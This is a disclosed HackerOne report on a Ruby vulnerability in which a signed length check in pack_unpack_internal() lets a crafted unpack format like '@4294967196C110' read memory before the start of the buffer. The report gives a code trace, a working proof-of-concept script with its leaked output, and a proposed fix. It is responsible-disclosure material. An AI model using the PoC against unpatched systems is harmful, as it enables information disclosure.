# controlled buffer under-read in pack_unpack_internal()

## Report Details
- **Report ID**: 298246
- **URL**: https://hackerone.com/reports/298246
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-12-15T12:21:22.135Z
- **Disclosed**: 2018-03-30T08:40:13.042Z

## Reporter
- **Username**: aerodudrizzt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Brief
-----
There is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).

Code Vulnerability
--------------------
**Vulnerable version:** 2.5.0 (rc) and prior (tested also on 2.3.3)
**Scope:** works on 32 bit and 64 bit versions
**File:** pack.c
**Function:** pack_unpack_internal()
**Code Trace:**
1. *len* is a **signed** long: 

    ```ruby
        long len;
    ```
1. *len* can be parsed using a decimal string representation, to hold **any** unsigned long value

    ```ruby
    ...
	else if (ISDIGIT(*p)) {
	    errno = 0;
		len = STRTOUL(p, (char**)&p, 10);
	    if (errno) {
		rb_raise(rb_eRangeError, "pack length too big");
	    }
	}
    ...
    ```
1. Using a **negative** *len* value, the '@' type will move the string backwards:

    ```ruby
    ...
	case '@':
        // EI - Trace: negative length will pass this check
	    if (len > RSTRING_LEN(str))
		  rb_raise(rb_eArgError, "@ outside of string");
         // EI - Trace: negative length will move s backwards
	    s = RSTRING_PTR(str) + len;
	    break;
    ...
    ```
1. Later unpacking will parse memory data before the buffer's start

PoC Script
------------
The script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).

```ruby
puts 'Version: ' + RUBY_VERSION
puts 2 ** 32 - 100

puts '**********************************'
puts 'Expected:'
"0123456789".unpack("C10").each { |x| puts x.to_s(16) }

puts '**********************************'
puts 'Leaked + Expected:'
"0123456789".unpack("@4294967196C110").each { |x| puts x.to_s(16) }
puts '**********************************'
```

**Output:**

```
Version: 2.5.0
4294967196
**********************************
Expected:
30
31
32
33
34
35
36
37
38
39
**********************************
Leaked + Expected:
28
13
e2
1
c1
24
0
0
40
43
df
1
65
48
92
20
3c
7e
df
1
72
65
6d
61
69
6e
64
65
72
0
0
0
7a
60
1
0
30
1
f5
1
50
c5
ef
1
7f
a3
0
0
30
1
f5
1
7a
60
5
0
40
43
df
1
8
13
e2
1
b1
24
0
0
40
43
df
1
65
88
91
20
3c
7e
df
1
6d
6f
64
75
6c
6f
0
0
0
0
0
0
5
80
52
0
3c
7e
df
1
30
31
32
33
34
35
36
37
38
39
**********************************
```

Proposed Fix:
---------------
*len* should be limited to hold only positive values, and it should be enforced right after *len* is parsed. A different fix could be to specifically check if *len* is negative in all dangerous places in the unpack() function.

## Impact

Impact
--------
An attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a **massive and controlled** information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.

This vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.

## Attachments
No attachments
